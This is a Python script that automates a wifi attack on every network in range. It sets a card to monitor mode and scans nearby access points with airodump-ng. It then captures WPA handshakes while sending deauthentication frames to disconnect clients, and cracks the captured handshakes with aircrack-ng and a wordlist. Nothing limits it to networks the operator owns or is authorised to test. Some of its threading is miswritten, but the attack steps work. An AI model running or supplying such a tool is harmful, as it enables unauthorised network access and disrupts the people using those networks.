from os import system
from time import sleep
import subprocess
import csv
import os
import signal
import pexpect
import threading

wordlist = ""

# Ask for name of scan for creating directory
directory_name = input("Enter the project name ")

# Create directory for all files created during the attack
fullPath = os.getcwd()+"/"+directory_name
try:
    os.mkdir(fullPath)
except OSError:
    print("The directory "+fullPath+" could not be created")
else:
    print("The directory "+fullPath+" was created")


# asks for wireless card to apply monitor mode on it
wireless_card = input("Enter your wireless card: ")

#airmonkill = "airmon-ng check kill"
print("Killing any running mounted airmon interfaces...")
subprocess.call(["airmon-ng","check", "kill"])
#airmonstart = "airmon-ng start "+wireless_card
sleep(5)
print("Putting "+wireless_card+" into monitoring mode...")
subprocess.call(["airmon-ng", "start", wireless_card])
wireless_card = wireless_card+"mon"
sleep(5)
csvpath = fullPath+"/"+directory_name
# runs a scan with airodump-ng to get available wifi

print("Dumping all traffic from reachable networks...")
cmd_airodump = pexpect.spawn('airodump-ng '+wireless_card+' --output-format csv -w '+csvpath)
cmd_airodump.expect([pexpect.TIMEOUT, pexpect.EOF], 5)

sleep(11)

print("Saving dumped networks in .csv file...")
with open(csvpath+'-01.csv', 'r') as csvfile:
    wifireader = csv.reader(csvfile, delimiter=' ', quotechar='|', skipinitialspace=True)
    for row in wifireader:
        print(', '.join(row))


mac_channel_list = []

print("Create MAC:Channel mapped two-dimensional list...")
with open(csvpath+'-01.csv', 'r') as csvfile2:
    reader = csv.reader(csvfile2,skipinitialspace=True)
    next(reader,None)
    for row in reader:
        new_list = []
        print(row)
        try:
            new_list.append(row[0])
            new_list.append(row[3])
            mac_channel_list.append(new_list)
        except IndexError:
            break

    print("Done...")
    #print("mylist: "+mylist)


print ("Starting threats, each running airodump-ng and aireplay-ng for each network in order to get handshakes...")
sleep(2)


mac_channel_list.pop(0)

def airodumTask(channel, mac):
    print(mac)
    # starts airodump-ng on a network to capture handshakes and open new xterm to deauth connected devices
    airodump2 = 'timeout 10s airodump-ng -c {0} --bssid {1} -w {2} {3}'.format(channel, mac, csvpath + "_handshake_"+mac, wireless_card)
    airodump_subprocess = subprocess.Popen(airodump2, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)
    sleep(5)
    # Deauthenticate the access point
    deauth = "aireplay-ng -0 {0} -a {1} {2}".format(3, mac, wireless_card)
    system(deauth)


for pair in mac_channel_list:
    #print(pair)
    t = threading.Thread(airodumTask(pair[1],pair[0]))
    t.start()


    #cmd_airodump2 = pexpect.spawn('airodump-ng -c '+pair[0]+' --bssid '+pair[1]+' -w '+csvpath+'_handshake_'+pair[1]+''+wireless_card)
    #cmd_airodump2.expect([pexpect.TIMEOUT, pexpect.EOF], 6)

    #pexpect.run('airodump-ng -c '+pair[0]+' --bssid '+pair[1]+' -w '+csvpath+'_handshake '+wireless_card,timeout=10)
    # Deauthenticate the access point
    #deauth = pexpect.spawn("aireplay-ng -0 5 -a "+pair[0]+""+wireless_card)
    #deauth.expect([pexpect.TIMEOUT, pexpect.EOF], 5)
    #pexpect.run("aireplay-ng -0 5 -a "+pair[0]+""+wireless_card)
    #sleep(2)
    #cmd_airodump2.close()
    #deauth.close()

sleep(10)
print("Cracking the handshake with aircrack-ng is starting...")

# 'Aircrack-ng' parameters set
wordlist = input("Specify the path to your wordlist dictionary: ")
print ("This could take a while according to the wordlist you are using, so be patient!")

def crackHandshake(filename):
    print()
    crack = 'aircrack-ng -a 2 {0} -w {1} '.format(filename, wordlist)
    system(crack)

for file in os.listdir(fullPath):
    filename = os.fsdecode(file)
    if filename.endswith(".cap"):
        t = threading.Thread(crackHandshake(filename))
        t.start()
#os.killpg(os.getpgid(airodump_subprocess.pid), signal.SIGTERM)

#system(airmonkill)